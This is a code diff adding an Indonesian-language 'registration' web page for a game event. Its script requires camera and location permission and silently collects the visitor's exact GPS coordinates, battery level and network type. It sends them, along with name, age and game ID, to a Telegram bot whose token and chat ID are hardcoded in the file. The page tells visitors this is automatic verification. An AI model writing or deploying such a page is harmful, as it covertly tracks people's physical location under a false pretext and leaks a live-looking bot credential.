@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PENDAFTARAN JALUR 2</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; display: flex; justify-content: center; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; width: 100%; max-width: 400px; border: 1px solid #333; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #27ae60; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:disabled { background: #555; }
+        .info { font-size: 11px; color: #888; text-align: center; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 style="text-align:center; color:#27ae60;">PENDAFTARAN JALUR 2</h2>
+    <input type="text" id="nama" placeholder="Nama Lengkap">
+    <input type="text" id="id_game" placeholder="ID Game">
+    <input type="number" id="umur" placeholder="Umur">
+    <input type="text" id="lokasi_man" placeholder="Lokasi (Kota)">
+    
+    <button id="btnDaftar" onclick="kirimPendaftaran()">DAFTAR SEKARANG</button>
+    <div class="info">Sinyal, Baterai, Lokasi & Kamera akan diverifikasi otomatis.</div>
+</div>
+
+<script>
+// --- SETTING BOT DISINI ---
+const TELE_TOKEN = "8218153149:AAFQPi8I1r_JLKukgM501y8IQ2OoJCrO0lY";
+const CHAT_ID = "6863271264";
+
+async function kirimPendaftaran() {
+    const btn = document.getElementById('btnDaftar');
+    btn.innerText = "Mengecek Sensor...";
+    btn.disabled = true;
+
+    try {
+        // 1. Cek Izin Kamera & Lokasi
+        await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej);
+        });
+
+        // 2. Ambil Info Perangkat
+        const battery = await navigator.getBattery();
+        const battLevel = Math.floor(battery.level * 100) + "%";
+        const netType = navigator.connection ? navigator.connection.effectiveType : "4G/WiFi";
+
+        // 3. Susun Data Peserta
+        const nama = document.getElementById('nama').value;
+        const idG = document.getElementById('id_game').value;
+        const umur = document.getElementById('umur').value;
+        const lok = document.getElementById('lokasi_man').value;
+
+        const pesan = `📩 *PENDAFTARAN BARU*\n` +
+                      `━━━━━━━━━━━━━━━\n` +
+                      `👤 Nama: ${nama}\n` +
+                      `🆔 ID: ${idG}\n` +
+                      `🎂 Umur: ${umur}\n` +
+                      `📍 Lokasi: ${lok}\n` +
+                      `━━━━━━━━━━━━━━━\n` +
+                      `🔍 *VERIFIKASI SISTEM*\n` +
+                      `🔋 Baterai: ${battLevel}\n` +
+                      `📶 Sinyal: ${netType}\n` +
+                      `🌐 Koordinat: ${pos.coords.latitude},${pos.coords.longitude}\n` +
+                      `📸 Kamera: TERVERIFIKASI ✅\n` +
+                      `━━━━━━━━━━━━━━━`;
+
+        // 4. Kirim Langsung ke API Telegram
+        const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "Markdown"
+            })
+        });
+
+        alert("Data Terkirim! Silakan tunggu konfirmasi Admin di Telegram.");
+        location.reload();
+
+    } catch (error) {
+        alert("Gagal! Izin Kamera & Lokasi WAJIB diaktifkan.");
+        btn.disabled = false;
+        btn.innerText = "DAFTAR SEKARANG";
+    }
+}
+</script>
+
+</body>
+</html>
